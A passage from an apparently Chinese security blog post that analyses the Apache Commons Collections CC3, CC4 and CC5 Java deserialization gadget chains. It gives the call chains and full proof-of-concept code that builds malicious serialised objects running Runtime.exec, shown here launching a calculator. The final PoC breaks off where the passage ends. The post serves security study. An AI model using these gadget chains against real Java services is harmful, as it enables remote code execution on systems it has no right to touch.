title="利用链分析"></a>利用链分析</h3><p>cc2使用TemplatesImpl类的newTransformer重建类实例来实现命令执行，cc2使用的是InvokerTransformer来反射调用newTransformer方法，而cc3中则是通过TrAXFilter这个类的构造方法来调用newTransformer。</p><p><img src="/2021/04/13/Java_04/20210412163548.png" alt="image-20210412163547614"></p><p>同时加入了一个新的InstantiateTransformer，以下是他的transform方法，会调用单个构造参数的构造方法创建实例，那么就可以利用它来调用newTransformer</p><p><img src="/2021/04/13/Java_04/20210412163701.png" alt="image-20210412163700011"></p><p>cc3其实更像是cc1前半段和cc2后半段的结合，POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> demo.Main.setFieldValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Str3am"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"calc.exe\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span> + System.nanoTime());</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain  = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Constructor[] constructors = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"><span class="comment">//        map.get("2333");</span></span><br><span class="line"></span><br><span class="line">        Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler)handler_constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">map</span>)</span>;</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map<span class="class">.<span class="keyword">class</span>&#125;,<span class="title">map_handler</span>)</span>;<span class="comment">//创建代理对象</span></span><br><span class="line"></span><br><span class="line">        Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override<span class="class">.<span class="keyword">class</span>,<span class="title">proxy_map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//序列化数据写入文件</span></span><br><span class="line">            ObjectOutputStream obout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obout.writeObject(handler);</span><br><span class="line">            <span class="comment">//从文件中读取并反序列化数据</span></span><br><span class="line">            ObjectInputStream obin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">            obin.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Commons-Collections-4"><a href="#Commons-Collections-4" class="headerlink" title="Commons Collections 4"></a>Commons Collections 4</h2><p>影响版本：</p><ul><li>Commons Collections 4.0</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 4.0</li></ul><h3 id="利用链-4"><a href="#利用链-4" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>heapify<span class="literal">()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">Down()</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">PriorityQueue</span>.</span></span>sift<span class="constructor">DownUsingComparator()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">TransformingComparator</span>.</span></span>compare<span class="literal">()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">InstantiateTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                                TrAXFilter#<span class="constructor">TrAXFilter()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span><span class="keyword">new</span><span class="constructor">Transformer()</span></span><br><span class="line">                                         <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>get<span class="constructor">TransletInstance()</span></span><br><span class="line">                                         <span class="module-access"><span class="module"><span class="identifier">TemplatesImpl</span>.</span></span>defineTransletClasses</span><br><span class="line">                                         <span class="keyword">new</span><span class="constructor">Instance()</span></span><br><span class="line">                                            <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="利用链分析-4"><a href="#利用链分析-4" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>没有啥新东西，前半段cc2，后半段cc3</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc4</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="string">"Cat"</span>);</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open  /System/Applications/Calculator.app\");"</span>;</span><br><span class="line">        <span class="comment">// 创建 static 代码块，并插入代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"EvilCat"</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>; <span class="comment">//设置父类为AbstractTranslet，避免报错</span></span><br><span class="line">        <span class="comment">// 写入.class 文件</span></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="keyword">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>()</span>;</span><br><span class="line">        setFieldValue(templates, <span class="string">"_bytecodes"</span>, targetByteCodes);</span><br><span class="line">        <span class="comment">// 进入 defineTransletClasses() 方法需要的条件</span></span><br><span class="line">        setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"name"</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">"_class"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections4.functors.InvokerTransformer"</span>).getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvokerTransformer transformer = (InvokerTransformer) constructor.newInstance(<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Object[] queue_array = <span class="keyword">new</span> Object[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field queue_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        queue_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        queue_field.set(queue,queue_array);</span><br><span class="line"></span><br><span class="line">        Field size = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"size"</span>);</span><br><span class="line">        size.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        size.set(queue,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field comparator_field = Class.forName(<span class="string">"java.util.PriorityQueue"</span>).getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        comparator_field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        comparator_field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc4"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> </span>&#123;</span><br><span class="line">        Field field = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="keyword">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><p>影响版本：</p><ul><li>Commons Collections 3,1</li></ul><p>测试环境：</p><ul><li>JDK 1.7</li><li>Commons Collections 3.1</li></ul><h3 id="利用链-5"><a href="#利用链-5" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line">                <span class="module-access"><span class="module"><span class="identifier">TiedMapEntry</span>.</span></span><span class="keyword">to</span><span class="constructor">String()</span></span><br><span class="line">                    <span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line">                        <span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">                                    <span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>get<span class="constructor">Method()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">                                    <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span></span><br><span class="line">                            <span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line">                                <span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line">                                    <span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><h3 id="利用链分析-5"><a href="#利用链分析-5" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>后半段用的是cc1，要执行map的get方法，选用的是commonscollection的TiedMapEntry类的toString，toString调用getValue，getValue调用get方法</p><p><img src="/2021/04/13/Java_04/20210413161015.png" alt="image-20210413161007076"></p><p><img src="/2021/04/13/Java_04/20210413161421.png" alt="image-20210413161420420"></p><p>然后就要找调用toString方法的地方，这里选用的是Java的BadAttributeValueExpException类的readObject方法，设置val为TiedMapEntry类，再设置TiedMapEntry类的map为恶意map即可</p><p><img src="/2021/04/13/Java_04/20210413161228.png" alt="image-20210413161227103"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CC5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//Class runtimeClass=Class.forName("java.lang.Runtime");</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">                //<span class="title">runtime</span></span>=runtimeClass.getMethod(<span class="string">"getRuntime"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//runtimeClass.getMethod("exec", String.class).invoke(runtime,"calc.exe");</span></span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Constructor[] constructors = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructors();</span><br><span class="line">        Constructor constructor = constructors[<span class="number">0</span>];</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Map map = (Map) constructor.newInstance(innermap, chain);</span><br><span class="line"><span class="comment">//        map.get("2333");</span></span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(map, <span class="number">123</span>);</span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">123</span>);</span><br><span class="line">        